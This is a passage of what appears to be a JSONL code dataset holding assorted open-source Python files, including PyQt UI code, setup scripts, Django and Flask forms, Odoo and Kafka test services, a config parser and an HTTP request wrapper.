QtGui.QWidget()\n        self.tab_queries.setObjectName(_fromUtf8(\"tab_queries\"))\n        self.tab.addTab(self.tab_queries, _fromUtf8(\"\"))\n        self.verticalLayout_2.addWidget(self.tab)\n        MainWindow.setCentralWidget(self.centralwidget)\n        self.menubar = QtGui.QMenuBar(MainWindow)\n        self.menubar.setGeometry(QtCore.QRect(0, 0, 800, 25))\n        self.menubar.setObjectName(_fromUtf8(\"menubar\"))\n        self.menuFile = QtGui.QMenu(self.menubar)\n        self.menuFile.setObjectName(_fromUtf8(\"menuFile\"))\n        MainWindow.setMenuBar(self.menubar)\n        self.statusbar = QtGui.QStatusBar(MainWindow)\n        self.statusbar.setObjectName(_fromUtf8(\"statusbar\"))\n        MainWindow.setStatusBar(self.statusbar)\n        self.actionOpen = QtGui.QAction(MainWindow)\n        self.actionOpen.setObjectName(_fromUtf8(\"actionOpen\"))\n        self.actionNew = QtGui.QAction(MainWindow)\n        self.actionNew.setObjectName(_fromUtf8(\"actionNew\"))\n        self.menuFile.addAction(self.actionOpen)\n        self.menuFile.addAction(self.actionNew)\n        self.menubar.addAction(self.menuFile.menuAction())\n\n        self.retranslateUi(MainWindow)\n        self.tab.setCurrentIndex(0)\n        QtCore.QMetaObject.connectSlotsByName(MainWindow)\n\n    def retranslateUi(self, MainWindow):\n        MainWindow.setWindowTitle(_translate(\"MainWindow\", \"Meta Manager\", None))\n        self.tab.setTabText(self.tab.indexOf(self.tab_tables), _translate(\"MainWindow\", \"\u03a0\u03af\u03bd\u03b1\u03ba\u03b5\u03c2\", None))\n        self.tab.setTabText(self.tab.indexOf(self.tab_queries), _translate(\"MainWindow\", \"Queries\", None))\n        self.menuFile.setTitle(_translate(\"MainWindow\", \"file\", None))\n        self.actionOpen.setText(_translate(\"MainWindow\", \"open\", None))\n        self.actionNew.setText(_translate(\"MainWindow\", \"New\", None))\n\n"}
{"text": "from setuptools import setup  # Always prefer setuptools over distutils\nfrom codecs import open  # To use a consistent encoding\nfrom os import path\n\nhere = path.abspath(path.dirname(__file__))\n\n# Get the long description from the relevant file\nwith open(path.join(here, 'README.rst'), encoding='utf-8') as f:\n    long_description = f.read()\n\nimport version\n\nsetup(\n    name='pyopenmensa',\n    version=version.STRING,\n\n    description='Usefull python wrapper for creating OpenMensa feeds',\n    long_description=long_description,\n\n    # The project's main homepage.\n    url='https://github.com/mswart/pyopenmensa',\n\n    # Author details\n    author='Malte Swart',\n    author_email='mswart@devtation.de',\n\n    # Choose your license\n    license='LGPL',\n\n    # See https://pypi.python.org/pypi?%3Aaction=list_classifiers\n    classifiers=[\n        # How mature is this project? Common values are\n        #   3 - Alpha\n        #   4 - Beta\n        #   5 - Production/Stable\n        'Development Status :: 5 - Production/Stable',\n\n        # Indicate who your project is intended for\n        'Intended Audience :: Developers',\n        'Topic :: Software Development :: Libraries',\n\n        # Pick your license as you wish (should match \"license\" above)\n        'License :: OSI Approved :: GNU Lesser General Public License v3 (LGPLv3)',\n\n        # Specify the Python versions you support here. In particular, ensure\n        # that you indicate whether you support Python 2, Python 3 or both.\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.2',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n    ],\n\n    # What does your project relate to?\n    keywords='openmensa feed framework',\n\n    package_dir={'pyopenmensa': ''},\n    packages=['pyopenmensa'],\n)\n"}
{"text": "# Created By: Virgil Dupras\n# Created On: 2011-07-09\n# Copyright 2013 Hardcoded Software (http://www.hardcoded.net)\n# \n# This software is licensed under the \"GPL v3\" License as described in the \"LICENSE\" file, \n# which should be included with this package. The terms are also available at \n# http://www.hardcoded.net/licenses/gplv3_license\n\nfrom cocoa.inter import PyGUIObject\n\nclass PyBuildPane(PyGUIObject):\n    def lastGenDesc(self) -> str:\n        return self.model.lastgen_desc\n    \n    def postProcessingEnabled(self) -> bool:\n        return self.model.post_processing_enabled\n    \n    def selectedEbookType(self) -> int:\n        return self.model.selected_ebook_type\n    \n    def setSelectedEbookType_(self, value: int):\n        self.model.selected_ebook_type = value\n    \n    def setEbookTitle_(self, value: str):\n        self.model.ebook_title = value\n    \n    def setEbookAuthor_(self, value: str):\n        self.model.ebook_author = value\n    \n    def generateMarkdown(self):\n        self.model.generate_markdown()\n    \n    def editMarkdown(self):\n        self.model.edit_markdown()\n    \n    def revealMarkdown(self):\n        self.model.reveal_markdown()\n    \n    def viewHTML(self):\n        self.model.view_html()\n    \n    def createEbook(self):\n        self.model.create_ebook()\n    \n"}
{"text": "# TreeLearn\n#\n# Copyright (C) Capital K Partners\n# Author: Alex Rubinsteyn\n# Contact: alex [at] capitalkpartners [dot] com \n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n# Lesser General Public License for more details.\n\n\nimport numpy as np \n\nclass ConstantLeaf:\n    \"\"\"Decision tree node which always predicts the same value.\"\"\"\n    def __init__(self, v):\n        self.v = v\n    \n    def to_str(self, indent=\"\", feature_names=None):\n        return indent + \"Constant(\" + str(self.v) + \")\"\n    \n    def __str__(self): \n        return self.to_str() \n        \n    def predict(self, X):\n        X = np.atleast_2d(X)\n        if isinstance(self.v, int):\n            dtype = 'int32'\n        else:\n            dtype = 'float'\n        outputs = np.zeros(X.shape[0], dtype=dtype)\n        outputs[:] = self.v\n        return outputs \n        \n    def fill_predict(self, X, outputs, mask):\n        outputs[mask] = self.v \n        \n    \n    \n"}
{"text": "\"\"\"\nGPU utilities.\n\"\"\"\n\nfrom functools import wraps\nfrom math import ceil\n\n# Load everything we need in this module from PyCUDA (but don't autoinit until\n# requested).\ntry:\n    from pycuda.tools import DeviceData\nexcept ImportError:\n    _pycuda_available = False\nelse:\n    _pycuda_available = True\n\n\n# Is this thing on?\n_enabled = False\n\n\nclass PyCUDAMissingError(Exception):\n    pass\n\n\ndef _require_pycuda(f):\n    @wraps(f)\n    def wrapper(*args, **kwargs):\n        if not _pycuda_available:\n            raise PyCUDAMissingError('Unable to load PyCUDA.')\n\n        return f(*args, **kwargs)\n\n    return wrapper\n\n\n@_require_pycuda\ndef enable():\n    \"\"\"\n    Initialize the GPU machinery.\n    \"\"\"\n\n    global _enabled\n\n    if _enabled:\n        return\n\n    import pycuda.autoinit\n\n    _enabled = True\n\n\ndef is_enabled():\n    \"\"\"\n    Check whether the GPU is available and initialized.\n    \"\"\"\n\n    return _enabled\n\n\n@_require_pycuda\ndef carve_array(xn, yn):\n    \"\"\"\n    Determine the best grid and block sizes given the input size.\n\n    Parameters:\n      xn: Size in the x direction (shorter stride).\n      yn: Size in the y direction (longer stride).\n\n    Returns:\n      Grid size tuple, block size tuple.\n    \"\"\"\n\n    dev = DeviceData()\n\n    # Align with the warp size in the x direction and use what remains for the\n    # y direction.\n    x_threads = dev.warp_size\n    y_threads = dev.max_threads // x_threads\n\n    assert x_threads * y_threads <= dev.max_threads\n\n    x_blocks = int(ceil(xn / x_threads))\n    y_blocks = int(ceil(yn / y_threads))\n\n    return (x_blocks, y_blocks), (x_threads, y_threads, 1)\n"}
{"text": "# -*- coding: utf-8 -*-\n# Copyright (C) 2013-Today  Carlos Eduardo Vercelino - CLVsol\n# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl).\n\nimport logging\n\nfrom odoo import api, fields, models\n\n_logger = logging.getLogger(__name__)\n\n\nclass LabTestResultMassEdit(models.TransientModel):\n    _inherit = 'clv.lab_test.result.mass_edit'\n\n    phase_id = fields.Many2one(\n        comodel_name='clv.phase',\n        string='Phase'\n    )\n    phase_id_selection = fields.Selection(\n        [('set', 'Set'),\n         ('remove', 'Remove'),\n         ], string='Phase:', default=False, readonly=False, required=False\n    )\n\n    @api.multi\n    def do_lab_test_result_mass_edit(self):\n        self.ensure_one()\n\n        super().do_lab_test_result_mass_edit()\n\n        for lab_test_result in self.lab_test_result_ids:\n\n            _logger.info(u'%s %s', '>>>>>', lab_test_result.code)\n\n            if self.phase_id_selection == 'set':\n                lab_test_result.phase_id = self.phase_id\n            if self.phase_id_selection == 'remove':\n                lab_test_result.phase_id = False\n\n        return True\n"}
{"text": "from collections import OrderedDict\nfrom config import *\n\n##########################################################\nclass Score:\n    # name\n    # desc\n    # ovelapScores\n    # errorNum\n    # overlap\n    # error\n    # successRateList\n\n    def __init__(self, name, desc, tracker=None, evalType=None, seqs=[],\n        overlapScores=[], errorNum=[], overlap=0, error=0, successRateList=[], precisionRateList=[]):\n        self.name = name\n        self.desc = desc\n        self.tracker = tracker\n        self.evalType = evalType\n        self.seqs = seqs\n        self.overlapScores = overlapScores\n        self.errorNum = errorNum\n        self.overlap = overlap\n        self.error = error\n        self.successRateList = successRateList\n        self.precisionRateList = precisionRateList\n\n        self.__dict__ = OrderedDict([\n            ('name', self.name),\n            ('desc', self.desc),\n            ('tracker', self.tracker),\n            ('evalType', self.evalType),\n            ('seqs', self.seqs),\n            ('overlap', self.overlap),\n            ('error', self.error),\n            ('overlapScores', self.overlapScores),\n            ('errorNum', self.errorNum),\n            ('successRateList', self.successRateList),\n            ('precisionRateList', self.precisionRateList)])\n\n    def refresh_dict(self):\n        self.__dict__ = OrderedDict([\n            ('name', self.name),\n            ('desc', self.desc),\n            ('tracker', self.tracker),\n            ('evalType', self.evalType),\n            ('seqs', self.seqs),\n            ('overlap', self.overlap),\n            ('error', self.error),\n            ('overlapScores', self.overlapScores),\n            ('errorNum', self.errorNum),\n            ('successRateList', self.successRateList),\n            ('precisionRateList', self.precisionRateList)])\n\n    def __lt__(self, other):\n        return self.name < other.name\n\n    @staticmethod\n    def getScoreFromLine(line):\n        # Input Example : \"DEF  Deformation - non-rigid object deformation.\"\n        attr = line.strip().split('\\t')\n        name = attr[0]\n        desc = attr[1]\n        return Score(name, desc)\n\n##########################################################\n\ndef getScoreList():\n    srcAttrFile = open(SEQ_SRC + ATTR_DESC_FILE)\n    attrLines = srcAttrFile.readlines()\n    attrList = []\n    for line in attrLines:\n        attr = Score.getScoreFromLine(line)\n        attrList.append(attr)\n    return attrList"}
{"text": "from mediawords.dbi.stories.stories import add_story\nfrom .setup_test_stories import TestStories\n\n\nclass TestAddStory(TestStories):\n\n    def test_add_story(self):\n        \"\"\"Test add_story().\"\"\"\n\n        media_id = self.test_medium['media_id']\n        feeds_id = self.test_feed['feeds_id']\n\n        # Basic story\n        story = {\n            'media_id': media_id,\n            'url': 'http://add.story/',\n            'guid': 'http://add.story/',\n            'title': 'test add story',\n            'description': 'test add story',\n            'publish_date': '2016-10-15 08:00:00',\n            'collect_date': '2016-10-15 10:00:00',\n            'full_text_rss': True,\n        }\n        added_story = add_story(db=self.db, story=story, feeds_id=feeds_id)\n        assert added_story\n        assert 'stories_id' in added_story\n        assert story['url'] == added_story['url']\n        assert added_story['full_text_rss'] is True\n\n        feeds_stories_tag_mapping = self.db.select(\n            table='feeds_stories_map',\n            what_to_select='*',\n            condition_hash={\n                'stories_id': added_story['stories_id'],\n                'feeds_id': feeds_id,\n            }\n        ).hashes()\n        assert len(feeds_stories_tag_mapping) == 1\n\n        story_urls = self.db.query(\n            \"select * from story_urls where stories_id = %(a)s\",\n            {'a': added_story['stories_id']}).hashes()\n        assert len(story_urls) == 1\n        assert story_urls[0]['url'] == added_story['url']\n\n        # Try adding a duplicate story\n        dup_story = add_story(db=self.db, story=story, feeds_id=feeds_id)\n        assert dup_story is not None\n        assert dup_story['stories_id'] == added_story['stories_id']\n"}
{"text": "# Copyright 2016 Capital One Services, LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\nfrom c7n.query import QueryResourceManager\nfrom c7n.manager import resources\n\n\n@resources.register('cache-cluster')\nclass CacheCluster(QueryResourceManager):\n\n    resource_type = 'aws.elasticache.cluster'\n\n\n@resources.register('cache-subnet-group')\nclass ClusterSubnetGroup(QueryResourceManager):\n\n    resource_type = 'aws.elasticache.subnet-group'\n\n\n@resources.register('cache-snapshot')\nclass CacheSnapshot(QueryResourceManager):\n\n    resource_type = 'aws.elasticache.snapshot'\n"}
{"text": "import os\nimport errno\nimport logging\nfrom logging.handlers import RotatingFileHandler\n\nclass Logger(object):\n\n    LOGGER_NAME = 'SSClient'\n    LOGFILE_MAXBYTES = 2*1024*1024\n    LOGFILE_BACKUPCOUNT = 5\n    LOGFILE_FORMAT = \"%(asctime)s:%(levelname)s:%(name)s:%(message)s\"\n    log_file = '/var/log/slipstream/client/slipstream-node.log'\n\n    def __init__(self, config_holder):\n        self.log_to_file = True\n        self.log_level = 'info'\n        self.logger_name = ''\n        config_holder.assign(self)\n        self.logger = None\n        self._configure_logger()\n\n    def _configure_logger(self):\n        self.logger = logging.getLogger(self.logger_name or Logger.LOGGER_NAME)\n\n        numeric_level = getattr(logging, self.log_level.upper(), None)\n        if not isinstance(numeric_level, int):\n            raise ValueError('Invalid log level: %s' % self.log_level)\n        self.logger.setLevel(numeric_level)\n\n        formatter = logging.Formatter(self.LOGFILE_FORMAT)\n\n        if self.log_to_file:\n            self._create_log_dir()\n            handler = RotatingFileHandler(self.log_file,\n                maxBytes=self.LOGFILE_MAXBYTES,\n                backupCount=self.LOGFILE_BACKUPCOUNT)\n        else:\n            handler = logging.StreamHandler()\n        handler.setFormatter(formatter)\n        self.logger.addHandler(handler)\n\n    def _create_log_dir(self):\n        log_dir = os.path.dirname(self.log_file)\n        try:\n            os.makedirs(log_dir)\n        except OSError, ex:\n            if ex.errno != errno.EEXIST:\n                raise\n\n    def get_logger(self):\n        return self.logger\n"}
{"text": "# Licensed to the Apache Software Foundation (ASF) under one or more\n# contributor license agreements.  See the NOTICE file distributed with\n# this work for additional information regarding copyright ownership.\n# The ASF licenses this file to You under the Apache License, Version 2.0\n# (the \"License\"); you may not use this file except in compliance with\n# the License.  You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nfrom kafkatest.services.performance import PerformanceService\nfrom kafkatest.utils.security_config import SecurityConfig\n\n\nclass EndToEndLatencyService(PerformanceService):\n\n    logs = {\n        \"end_to_end_latency_log\": {\n            \"path\": \"/mnt/end-to-end-latency.log\",\n            \"collect_default\": True},\n    }\n\n    def __init__(self, context, num_nodes, kafka, security_protocol, topic, num_records, consumer_fetch_max_wait=100, acks=1):\n        super(EndToEndLatencyService, self).__init__(context, num_nodes)\n        self.kafka = kafka\n        self.security_config = SecurityConfig(security_protocol)\n        self.security_protocol = security_protocol\n        self.args = {\n            'topic': topic,\n            'num_records': num_records,\n            'consumer_fetch_max_wait': consumer_fetch_max_wait,\n            'acks': acks\n        }\n\n    def _worker(self, idx, node):\n        args = self.args.copy()\n        self.security_config.setup_node(node)\n        if self.security_protocol == SecurityConfig.SSL:\n            ssl_config_file = SecurityConfig.SSL_DIR + \"/security.properties\"\n            node.account.create_file(ssl_config_file, str(self.security_config))\n        else:\n            ssl_config_file = \"\"\n        args.update({\n            'zk_connect': self.kafka.zk.connect_setting(),\n            'bootstrap_servers': self.kafka.bootstrap_servers(),\n            'ssl_config_file': ssl_config_file\n        })\n\n        cmd = \"/opt/kafka/bin/kafka-run-class.sh kafka.tools.EndToEndLatency \"\\\n              \"%(bootstrap_servers)s %(topic)s %(num_records)d \"\\\n              \"%(acks)d 20 %(ssl_config_file)s\" % args\n\n        cmd += \" | tee /mnt/end-to-end-latency.log\"\n\n        self.logger.debug(\"End-to-end latency %d command: %s\", idx, cmd)\n        results = {}\n        for line in node.account.ssh_capture(cmd):\n            if line.startswith(\"Avg latency:\"):\n                results['latency_avg_ms'] = float(line.split()[2])\n            if line.startswith(\"Percentiles\"):\n                results['latency_50th_ms'] = float(line.split()[3][:-1])\n                results['latency_99th_ms'] = float(line.split()[6][:-1])\n                results['latency_999th_ms'] = float(line.split()[9])\n        self.results[idx-1] = results\n"}
{"text": "from django.test import TestCase\r\n\r\nfrom user_management.forms import UserForm, BasicInfoForm, StudentInfoForm\r\nfrom django.contrib.auth.models import User, Group\r\nfrom django.contrib.auth.hashers import check_password\r\nfrom datetime import datetime\r\nfrom user_management.management.commands import initgroups\r\nimport logging\r\n\r\nLOG = logging.getLogger('app')\r\n\r\n\r\nclass BasicInfoFormTestCase(TestCase):\r\n    @classmethod\r\n    def setUpTestData(cls):\r\n        cmd = initgroups.Command()\r\n        cmd.handle()\r\n\r\n    def setUp(self):\r\n        form_data = {\r\n            'username': 'u_test_basic_info_form',\r\n            'password1': 'dhaval27',\r\n            'password2': 'dhaval27',\r\n            'email': 'mail@dhaval.com'\r\n        }\r\n        form = UserForm(data=form_data)\r\n        self.assertTrue(form.is_valid())\r\n        LOG.debug(form.errors)\r\n        u = form.save()\r\n\r\n        form_data = {\r\n            'date_of_birth': '22/7/89',\r\n            'contact_number': '9881585223',\r\n            'group': Group.objects.get(name='Student').pk\r\n        }\r\n        form = BasicInfoForm(data=form_data, instance=u)\r\n        self.assertTrue(form.is_valid())\r\n        LOG.debug(form.errors)\r\n        u = form.save()\r\n\r\n    def test_basic_info_exists(self):\r\n        test_user = User.objects.get(username='u_test_basic_info_form')\r\n        self.assertTrue(test_user.basicinfo is not None)\r\n\r\n    def test_basic_info_save(self):\r\n        test_user = User.objects.get(username='u_test_basic_info_form')\r\n        form_data = {\r\n            'date_of_birth': '22/7/89',\r\n            'contact_number': '9881585223',\r\n            'group': Group.objects.get(name='Student').pk\r\n        }\r\n        form = BasicInfoForm(data=form_data, instance=test_user)\r\n        self.assertTrue(form.is_valid())\r\n        form.save()\r\n\r\n    def test_date_of_birth(self):\r\n        test_user = User.objects.get(username='u_test_basic_info_form')\r\n        dob = test_user.basicinfo.date_of_birth\r\n        entered_dob = datetime(1989, 7, 22).date()\r\n        self.assertEqual(dob, entered_dob)\r\n\r\n    def test_contact_number(self):\r\n        test_user = User.objects.get(username='u_test_basic_info_form')\r\n        self.assertEqual(\r\n            test_user.basicinfo.contact_number, '9881585223')\r\n\r\n    def tearDown(self):\r\n        Group.objects.all().delete()\r\n"}
{"text": "#\n# Copyright (C) 2012, 2013 Satoru SATOH <ssato @ redhat.com>\n# License: MIT\n#\nfrom trifle.anyconfig.compat import StringIO\nfrom trifle.anyconfig.globals import LOGGER as logging\n\nimport trifle.anyconfig.mergeabledict as D\nimport trifle.anyconfig.utils as U\nimport os.path\nimport os\n\nSUPPORTED = False\n\n\ndef mk_opt_args(keys, kwargs):\n    \"\"\"\n    Make optional kwargs valid and optimized for each backend.\n\n    :param keys: optional argument names\n    :param kwargs: keyword arguements to process\n\n    >>> mk_opt_args((\"aaa\", ), dict(aaa=1, bbb=2))\n    {'aaa': 1}\n    >>> mk_opt_args((\"aaa\", ), dict(bbb=2))\n    {}\n    \"\"\"\n    def filter_kwargs(kwargs):\n        for k in keys:\n            if k in kwargs:\n                yield (k, kwargs[k])\n\n    return dict((k, v) for k, v in filter_kwargs(kwargs))\n\n\ndef mk_dump_dir_if_not_exist(f):\n    \"\"\"\n    Make dir to dump f if that dir does not exist.\n\n    :param f: path of file to dump\n    \"\"\"\n    dumpdir = os.path.dirname(f)\n\n    if not os.path.exists(dumpdir):\n        logging.debug(\"Creating output dir as it's not found: \" + dumpdir)\n        os.makedirs(dumpdir)\n\n\nclass ConfigParser(object):\n\n    _type = None\n    _priority = 0   # 0 (lowest priority) .. 99  (highest priority)\n    _extensions = []\n    _container = D.MergeableDict\n    _supported = False\n\n    _load_opts = []\n    _dump_opts = []\n\n    @classmethod\n    def type(cls):\n        return cls._type\n\n    @classmethod\n    def priority(cls):\n        return cls._priority\n\n    @classmethod\n    def extensions(cls):\n        return cls._extensions\n\n    @classmethod\n    def supports(cls, config_file=None):\n        if config_file is None:\n            return cls._supported\n        else:\n            return cls._supported and \\\n                U.get_file_extension(config_file) in cls._extensions\n\n    @classmethod\n    def container(cls):\n        return cls._container\n\n    @classmethod\n    def set_container(cls, container):\n        cls._container = container\n\n    @classmethod\n    def load_impl(cls, config_fp, **kwargs):\n        \"\"\"\n        :param config_fp:  Config file object\n        :param kwargs: backend-specific optional keyword parameters :: dict\n\n        :return: dict object holding config parameters\n        \"\"\"\n        raise NotImplementedError(\"Inherited class should implement this\")\n\n    @classmethod\n    def loads(cls, config_content, **kwargs):\n        \"\"\"\n        :param config_content:  Config file content\n        :param kwargs: optional keyword parameters to be sanitized :: dict\n\n        :return: cls.container() object holding config parameters\n        \"\"\"\n        config_fp = StringIO(config_content)\n        create = cls.container().create\n        return create(cls.load_impl(config_fp,\n                                    **mk_opt_args(cls._load_opts, kwargs)))\n\n    @classmethod\n    def load(cls, config_path, **kwargs):\n        \"\"\"\n        :param config_path:  Config file path\n        :param kwargs: optional keyword parameters to be sanitized :: dict\n\n        :return: cls.container() object holding config parameters\n        \"\"\"\n        create = cls.container().create\n        return create(cls.load_impl(open(config_path),\n                                    **mk_opt_args(cls._load_opts, kwargs)))\n\n    @classmethod\n    def dumps_impl(cls, data, **kwargs):\n        \"\"\"\n        :param data: Data to dump :: dict\n        :param kwargs: backend-specific optional keyword parameters :: dict\n\n        :return: string represents the configuration\n        \"\"\"\n        raise NotImplementedError(\"Inherited class should implement this\")\n\n    @classmethod\n    def dump_impl(cls, data, config_path, **kwargs):\n        \"\"\"\n        :param data: Data to dump :: dict\n        :param config_path: Dump destination file path\n        :param kwargs: backend-specific optional keyword parameters :: dict\n        \"\"\"\n        open(config_path, \"w\").write(cls.dumps_impl(data, **kwargs))\n\n    @classmethod\n    def dumps(cls, data, **kwargs):\n        \"\"\"\n        :param data: Data to dump :: cls.container()\n        :param kwargs: optional keyword parameters to be sanitized :: dict\n\n        :return: string represents the configuration\n        \"\"\"\n        convert_to = cls.container().convert_to\n        return cls.dumps_impl(convert_to(data),\n                              **mk_opt_args(cls._dump_opts, kwargs))\n\n    @classmethod\n    def dump(cls, data, config_path, **kwargs):\n        \"\"\"\n        :param data: Data to dump :: cls.container()\n        :param config_path: Dump destination file path\n        :param kwargs: optional keyword parameters to be sanitized :: dict\n        \"\"\"\n        convert_to = cls.container().convert_to\n        mk_dump_dir_if_not_exist(config_path)\n        cls.dump_impl(convert_to(data), config_path,\n                      **mk_opt_args(cls._dump_opts, kwargs))\n\n# vim:sw=4:ts=4:et:\n"}
{"text": "\"\"\"Library used by other scripts under tools/ directory.\"\"\"\n\n# Author: Zhang Huangbin <zhb@iredmail.org>\n\nimport os\nimport sys\nimport logging\nimport web\n\ndebug = False\n\n# Set True to print SQL queries.\nweb.config.debug = debug\n\nos.environ['LC_ALL'] = 'C'\n\nrootdir = os.path.abspath(os.path.dirname(__file__)) + '/../'\nsys.path.insert(0, rootdir)\n\nimport settings\nfrom libs import iredutils\n\nbackend = settings.backend\nif backend in ['ldap', 'mysql']:\n    sql_dbn = 'mysql'\nelif backend in ['pgsql']:\n    sql_dbn = 'postgres'\nelse:\n    sys.exit('Error: Unsupported backend (%s).' % backend)\n\n# Config logging\nlogging.basicConfig(level=logging.INFO,\n                    format='* [%(asctime)s] %(message)s',\n                    datefmt='%Y-%m-%d %H:%M:%S')\n\nlogger = logging.getLogger('iRedAdmin-Pro')\n\n\ndef print_error(msg):\n    print '< ERROR > ' + msg\n\n\ndef get_db_conn(db):\n    try:\n        conn = web.database(dbn=sql_dbn,\n                            host=settings.__dict__[db + '_db_host'],\n                            port=int(settings.__dict__[db + '_db_port']),\n                            db=settings.__dict__[db + '_db_name'],\n                            user=settings.__dict__[db + '_db_user'],\n                            pw=settings.__dict__[db + '_db_password'])\n\n        conn.supports_multiple_insert = True\n        return conn\n    except Exception, e:\n        print_error(e)\n\n\n# Log in `iredadmin.log`\ndef log_to_iredadmin(msg, event, admin='', loglevel='info'):\n    conn = get_db_conn('iredadmin')\n\n    try:\n        conn.insert('log',\n                    admin=admin,\n                    event=event,\n                    loglevel=loglevel,\n                    msg=str(msg),\n                    ip='127.0.0.1',\n                    timestamp=iredutils.get_gmttime())\n    except:\n        pass\n\n    return None\n"}
{"text": "from flask_wtf import FlaskForm\nfrom wtforms import (\n    StringField,\n    PasswordField,\n    BooleanField,\n    SubmitField,\n    ValidationError, )\nfrom wtforms.validators import (\n    InputRequired,\n    Length,\n    Email,\n    Regexp,\n    EqualTo, )\n\nfrom .models import User\n\n\nclass LoginForm(FlaskForm):\n    email = StringField(\n        'Email', validators=[InputRequired(), Length(1, 64), Email()])\n    password = PasswordField('Senha', validators=[InputRequired()])\n    remember_me = BooleanField('Lembrar')\n    submit = SubmitField('Log In')\n\n\nclass RegistrationForm(FlaskForm):\n    email = StringField(\n        'Email', validators=[InputRequired(), Length(1, 64), Email()])\n    password = PasswordField(\n        'Senha',\n        validators=[\n            InputRequired(), EqualTo(\n                'password2', message='Senhas devem ser iguais')\n        ])\n    password2 = PasswordField('Confirmar senha', validators=[InputRequired()])\n    submit = SubmitField('Registrar')\n\n    def validate_email(self, field):\n        if User.query.filter_by(email=field.data).first():\n            raise ValidationError('Esse email j\u00e1 est\u00e1 em uso!')\n"}
{"text": "#\n# Honeybee: A Plugin for Environmental Analysis (GPL) started by Mostapha Sadeghipour Roudsari\n# \n# This file is part of Honeybee.\n# \n# Copyright (c) 2013-2020, Mostapha Sadeghipour Roudsari <mostapha@ladybug.tools> \n# Honeybee is free software; you can redistribute it and/or modify \n# it under the terms of the GNU General Public License as published \n# by the Free Software Foundation; either version 3 of the License, \n# or (at your option) any later version. \n# \n# Honeybee is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of \n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the \n# GNU General Public License for more details.\n# \n# You should have received a copy of the GNU General Public License\n# along with Honeybee; If not, see <http://www.gnu.org/licenses/>.\n# \n# @license GPL-3.0+ <http://spdx.org/licenses/GPL-3.0+>\n\n\n\"\"\"\nUse this component to get basic information on Honeybee Objects, whether they are HBSrfs or HBZones.\n\n-\nProvided by Honeybee 0.0.66\n\n    Args:\n        _HBObjects: Any valid Honeybee object.\n    Returns:\n        readMe!: Information about the Honeybee object.  Connect to a panel to visualize.\n\"\"\"\nghenv.Component.Name = \"Honeybee_AskMe\"\nghenv.Component.NickName = 'askMe'\nghenv.Component.Message = 'VER 0.0.66\\nJUL_07_2020'\nghenv.Component.IconDisplayMode = ghenv.Component.IconDisplayMode.application\nghenv.Component.Category = \"HB-Legacy\"\nghenv.Component.SubCategory = \"00 | Honeybee\"\n#compatibleHBVersion = VER 0.0.56\\nJUL_24_2017\n#compatibleLBVersion = VER 0.0.59\\nFEB_01_2015\ntry: ghenv.Component.AdditionalHelpFromDocStrings = \"1\"\nexcept: pass\n\n\nimport scriptcontext as sc\ntry:\n    # call the objects from the lib\n    hb_hive = sc.sticky[\"honeybee_Hive\"]()\n    HBObjectsFromHive = hb_hive.visualizeFromHoneybeeHive(_HBObjects)\n    for HBO in HBObjectsFromHive:\n        print HBO\nexcept Exception, e:\n    print \"Honeybee has no idea what this object is! Vviiiiiiz!\"\n    pass\n"}
{"text": "# Filename: request.py\n\n\"\"\"\nLendingClub2 Request Module\n\nInterface functions:\n    get\n    post\n\"\"\"\n\n# Standard libraries\nimport datetime\nimport time\n\n# Requests\nimport requests\n\n# Lending Club\nfrom lendingclub2.authorization import Authorization\nfrom lendingclub2.config import REQUEST_LIMIT_PER_SEC\nfrom lendingclub2.error import LCError\n\n__LAST_REQUEST_TIMESTAMP = None\n\n\n# pylint: disable=global-statement\ndef get(*args, **kwargs):\n    \"\"\"\n    Wrapper around :py:func:`requests.get` function.\n\n    :param args: tuple - positional arguments for :py:func:`requests.get`.\n    :param kwargs: dict - keyword arguments for :py:func:`requests.get`.\n    :returns: instance of :py:class:`requests.Response`.\n    \"\"\"\n    global __LAST_REQUEST_TIMESTAMP\n    __add_headers_to_kwargs(kwargs)\n    __wait_request()\n    try:\n        response = requests.get(*args, **kwargs)\n        __LAST_REQUEST_TIMESTAMP = datetime.datetime.now()\n        return response\n    except requests.ConnectionError as exc:\n        fstr = \"Cannot connect correctly\"\n        raise LCError(fstr, details=str(exc))\n# pylint: enable=global-statement\n\n\n# pylint: disable=global-statement\ndef post(*args, **kwargs):\n    \"\"\"\n    Wrapper around :py:func:`requests.post` function.\n\n    :param args: tuple - positional arguments for :py:func:`requests.post`.\n    :param kwargs: dict - keyword arguments for :py:func:`requests.post`.\n    :returns: instance of :py:class:`requests.Response`.\n    \"\"\"\n    global __LAST_REQUEST_TIMESTAMP\n    __add_headers_to_kwargs(kwargs)\n    __wait_request()\n    try:\n        response = requests.post(*args, **kwargs)\n        __LAST_REQUEST_TIMESTAMP = datetime.datetime.now()\n        return response\n    except requests.ConnectionError as exc:\n        fstr = \"Cannot connect correctly\"\n        raise LCError(fstr, details=str(exc))\n# pylint: enable=global-statement\n\n\n# Internal functions\ndef __add_headers_to_kwargs(kwargs):\n    \"\"\"\n    Add authorization key to the headers in keyword arguments.\n\n    :param kwargs: dict\n    